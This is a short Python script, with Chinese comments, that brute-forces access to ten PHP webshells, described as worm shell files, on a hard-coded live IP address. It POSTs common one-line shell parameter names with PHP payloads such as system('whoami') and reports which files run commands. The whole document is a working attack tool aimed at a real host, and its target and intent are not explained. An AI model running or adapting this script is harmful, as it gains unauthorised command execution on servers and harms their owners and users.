#!/usr/bin/env python3
"""批量测试 124.71 的蠕虫shell文件 - 常见参数+密码"""
import urllib.request, urllib.parse, concurrent.futures

FILES = ["2365.php", "5d.php", "md.php", "spread.php", "bbrdcdeecv.php", "bdqfuwlhpx.php",
         "bhusqqcpbg.php", "bqiqievwdn.php", "brudguvila.php", "ciywhusedp.php"]
B = "http://124.71.142.158:9096"
UA = {"User-Agent": "Mozilla/5.0"}

# 常见一句话参数名 + 值
payloads = [
    ("cmd", "echo PWN_CMD;"),
    ("c", "echo PWN_C;"),
    ("pass", "echo PWN_PASS;"),
    ("x", "echo PWN_X;"),
    ("a", "echo PWN_A;"),
    ("z0", "echo PWN_Z0;"),
    ("z1", "echo PWN_Z1;"),
    ("pwd", "echo PWN_PWD;"),
    ("password", "echo PWN_PW;"),
    ("shell", "echo PWN_SH;"),
    ("1", "echo PWN_1;"),
    ("action", "whoami"),
    ("cmd", "system('whoami');"),
    ("c", "system('whoami');"),
]

def test_file(f):
    hits = []
    for k, v in payloads:
        try:
            data = urllib.parse.urlencode({k: v}).encode()
            r = urllib.request.urlopen(urllib.request.Request(f"{B}/{f}", data=data, headers=UA), timeout=6)
            body = r.read().decode("utf-8", "ignore")
            if "PWN_" in body or "administrator" in body.lower() or "nt authority" in body.lower():
                hits.append(f"{k}={v} -> {body.strip()[-60:]!r}")
        except Exception:
            pass
    return f, hits

with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
    for f, hits in ex.map(test_file, FILES):
        if hits:
            print(f"### {f}:")
            for h in hits:
                print("   ", h)
        else:
            print(f"{f}: 0命中")
